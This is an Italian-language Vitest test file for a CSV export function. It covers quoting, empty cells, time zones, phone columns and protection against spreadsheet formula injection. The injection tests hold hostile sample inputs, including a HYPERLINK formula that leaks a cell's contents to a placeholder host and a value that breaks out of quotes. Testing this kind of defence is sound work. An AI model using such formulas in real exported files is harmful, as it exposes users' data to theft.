import { describe, expect, it } from "vitest";
import { toCsv } from "./csv";

type Row = { id: number; name: string | null; active: boolean; note: string | null; createdAt: Date };

const columns = [
    { header: "ID", value: (row: Row) => row.id },
    { header: "Nome", value: (row: Row) => row.name },
    { header: "Attivo", value: (row: Row) => row.active },
    { header: "Note", value: (row: Row) => row.note },
    { header: "Creato il", value: (row: Row) => row.createdAt },
];

describe("toCsv", () => {
    it("scrive intestazione e righe separate da punto e virgola, terminate da CRLF", () => {
        const csv = toCsv<Row>(
            [{ id: 1, name: "Mario", active: true, note: null, createdAt: new Date("2026-01-01T10:00:00.000Z") }],
            columns
        );

        expect(csv).toBe("﻿ID;Nome;Attivo;Note;Creato il\r\n1;Mario;Sì;;2026-01-01T10:00:00.000Z\r\n");
    });

    it("mette tra virgolette i campi con punto e virgola, virgolette o a-capo, raddoppiando le virgolette interne", () => {
        const csv = toCsv<Row>(
            [
                {
                    id: 2,
                    name: 'Rossi; "il Mario"\nsecondo',
                    active: false,
                    note: null,
                    createdAt: new Date("2026-01-02T00:00:00.000Z"),
                },
            ],
            columns
        );

        expect(csv).toContain('"Rossi; ""il Mario""\nsecondo"');
        expect(csv).toContain(";No;");
    });

    /**
     * Il punto e virgola basta da solo a chiedere le virgolette: senza, Excel spezzerebbe la
     * cella in due. La virgola invece non è il separatore e resta così com'è.
     */
    it.each([
        ["Rossi; Mario", '"Rossi; Mario"'],
        ["Rossi, Mario", "Rossi, Mario"],
    ])("scrive %j come %j", (name, expected) => {
        const csv = toCsv<Row>(
            [{ id: 4, name, active: true, note: null, createdAt: new Date("2026-01-04T00:00:00.000Z") }],
            columns
        );

        expect(csv.split("\r\n")[1]).toBe(`4;${expected};Sì;;2026-01-04T00:00:00.000Z`);
    });

    it("un valore null o undefined diventa una cella vuota", () => {
        const csv = toCsv<Row>(
            [{ id: 3, name: null, active: true, note: null, createdAt: new Date("2026-01-03T00:00:00.000Z") }],
            columns
        );

        expect(csv.split("\r\n")[1]).toBe("3;;Sì;;2026-01-03T00:00:00.000Z");
    });

    it("senza righe scrive solo l'intestazione", () => {
        expect(toCsv<Row>([], columns)).toBe("﻿ID;Nome;Attivo;Note;Creato il\r\n");
    });
    describe("testi che un foglio di calcolo leggerebbe come formula", () => {
        const noteColumn = [{ header: "Note", value: (row: { note: string | number | null }) => row.note }];
        const cellOf = (note: string | number | null) => toCsv([{ note }], noteColumn).split("\r\n")[1];

        it.each(["=1+1", "+39 333 1234567", "-2+3", "@SUM(A1)", "\tcmd", "\r=1+1"])(
            "antepone un apostrofo a %j",
            (note) => {
                expect(cellOf(note).replace(/^"|"$/g, "")).toMatch(/^'/);
            }
        );

        it("neutralizza anche un campo che va tra virgolette", () => {
            expect(cellOf('=HYPERLINK("http://x.example/?d="&A2,"clic")')).toBe(
                '"\'=HYPERLINK(""http://x.example/?d=""&A2,""clic"")"'
            );
        });

        it.each(["-5.00", "+12", "42", "3.5"])("lascia intatto il numero scritto come testo %j", (note) => {
            expect(cellOf(note)).toBe(note);
        });

        it("lascia intatti i numeri veri e i testi che non iniziano con un carattere di formula", () => {
            expect(cellOf(-5)).toBe("-5");
            expect(cellOf("Mario = Rossi")).toBe("Mario = Rossi");
        });
    });

    describe("date nel fuso del laboratorio", () => {
        const dateOf = (createdAt: Date, timeZone?: string) =>
            toCsv<Row>([{ id: 1, name: null, active: true, note: null, createdAt }], columns, { timeZone })
                .split("\r\n")[1]
                .split(";")[4];

        it("scrive la data e l'ora del fuso, non l'istante UTC", () => {
            // 22:30 UTC del 21 settembre sono le 00:30 del 22 a Roma (ora legale).
            expect(dateOf(new Date("2026-09-21T22:30:00.000Z"), "Europe/Rome")).toBe("2026-09-22 00:30");
        });

        it("segue l'ora solare in inverno e non scrive mai le 24", () => {
            expect(dateOf(new Date("2026-01-15T23:05:00.000Z"), "Europe/Rome")).toBe("2026-01-16 00:05");
            expect(dateOf(new Date("2026-01-15T23:05:00.000Z"), "UTC")).toBe("2026-01-15 23:05");
        });

        it("senza fuso resta l'istante ISO in UTC", () => {
            expect(dateOf(new Date("2026-09-21T22:30:00.000Z"))).toBe("2026-09-21T22:30:00.000Z");
        });
    });

    describe("colonne di testo (telefoni)", () => {
        const phoneOf = (phone: string) =>
            toCsv<{ phone: string }>([{ phone }], [{ header: "Tel", value: (row) => row.phone, asText: true }]).split(
                "\r\n"
            )[1];

        it.each([
            ["0612345678", '"=""0612345678"""'],
            ["333 1234567", '"=""333 1234567"""'],
            ["+39 333 1234567", '"=""+39 333 1234567"""'],
            ["06 1234567 - 333 1234567", '"=""06 1234567 - 333 1234567"""'],
        ])("scrive %j come formula di testo costante", (phone, expected) => {
            expect(phoneOf(phone)).toBe(expected);
        });

        it("non fa mai passare una formula vera dietro la scorciatoia dei telefoni", () => {
            expect(phoneOf('=HYPERLINK("http://x.example")')).toBe(`"'=HYPERLINK(""http://x.example"")"`);
            expect(phoneOf('1"&A1&"')).toBe('"1""&A1&"""');
        });

        it("lascia com'è un testo che non è un numero, come N/D", () => {
            expect(phoneOf("N/D")).toBe("N/D");
        });

        it("una colonna senza asText non cambia", () => {
            expect(
                toCsv<{ phone: string }>([{ phone: "0612345678" }], [{ header: "Tel", value: (r) => r.phone }])
            ).toContain("\r\n0612345678\r\n");
        });
    });
});
